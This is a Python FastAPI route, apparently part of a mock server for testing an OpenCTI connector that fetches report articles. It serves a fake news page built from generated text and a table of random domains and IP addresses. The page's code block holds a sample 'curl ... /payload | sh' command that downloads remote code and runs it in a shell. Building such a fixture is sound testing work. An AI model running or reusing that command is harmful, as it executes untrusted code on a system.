"""A news site, for the OpenCTI report-article-fetcher connector.

The connector downloads the page an RSS report links to. It refuses hosts that do not
resolve to a public address, so the host is a real one (www.example.net) that the proxy
answers here. The page title comes from the URL slug, so a report named after the slug
is the article.
"""

from fastapi import APIRouter, Response

from app.fake import fake

HOSTS = ["www.example.net"]
router = APIRouter(prefix="/report-article-fetcher", tags=["Report article fetcher"])


@router.get("/news/{slug}")
async def article(slug: str) -> Response:
    """An article page: a long body, a table and code between navigation and footer."""
    title = " ".join(slug.split("-")).capitalize()
    paragraphs = "\n".join(f"<p>{fake.paragraph(nb_sentences=6)}</p>" for _ in range(8))
    rows = "\n".join(
        f"<tr><td>{fake.domain_name()}</td><td>{fake.ipv4_public()}</td></tr>"
        for _ in range(4)
    )
    html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>{title}</title></head>
<body>
<nav><a href="/">Home</a> <a href="/news">News</a> <a href="/about">About</a></nav>
<main><article>
<h1>{title}</h1>
{paragraphs}
<table><tr><th>Domain</th><th>IP address</th></tr>
{rows}
</table>
<pre><code>curl -s https://{fake.domain_name()}/payload | sh</code></pre>
</article></main>
<footer>Copyright example.net. All rights reserved.</footer>
</body></html>"""
    return Response(html, media_type="text/html; charset=utf-8")
